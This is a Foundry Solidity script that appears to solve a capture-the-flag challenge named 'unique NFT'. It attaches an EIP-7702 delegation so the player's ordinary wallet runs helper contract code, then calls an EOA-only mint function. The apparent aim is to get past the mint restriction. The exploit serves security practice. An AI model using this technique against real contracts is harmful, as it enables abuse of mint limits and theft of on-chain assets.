// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import {Script, console} from "forge-std/Script.sol";
import {UniqueNFT} from "../../src/challenge-38-unique-nft/UniqueNFT.sol";
import {NFTMinter} from "../../src/challenge-38-unique-nft/NFTMinter.sol";

contract SolveUniqueNFT is Script {
    function run() public {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        address uniqueNFTAddress = vm.envAddress("UNIQUE_NFT");

        address player = vm.addr(privateKey);
        UniqueNFT uniqueNFT = UniqueNFT(uniqueNFTAddress);

        vm.startBroadcast(privateKey);

        NFTMinter minter = new NFTMinter();

        vm.signAndAttachDelegation(address(minter), privateKey);

        NFTMinter(player).resetEntered();
        NFTMinter(player).setUniqueNFT(address(uniqueNFT));

        uniqueNFT.mintNFTEOA();

        vm.stopBroadcast();

        console.log("Player:", player);
        console.log("NFTMinter implementation:", address(minter));
        console.log("Player NFT balance:", uniqueNFT.balanceOf(player));
    }
}
